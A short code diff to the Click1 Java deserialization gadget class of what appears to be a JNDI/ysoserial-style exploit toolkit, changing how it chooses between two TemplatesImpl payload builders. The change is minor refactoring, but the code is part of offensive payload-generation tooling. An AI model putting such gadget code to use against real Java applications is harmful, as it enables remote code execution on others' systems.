@@ -13,6 +13,7 @@ import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
@@ -73,7 +74,7 @@ public class Click1 implements ObjectPayload<Object> {
         // so its getOutputProperties() method will be called
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
         final Object template;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             template = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             template = Gadgets.createTemplatesImpl(type, param);
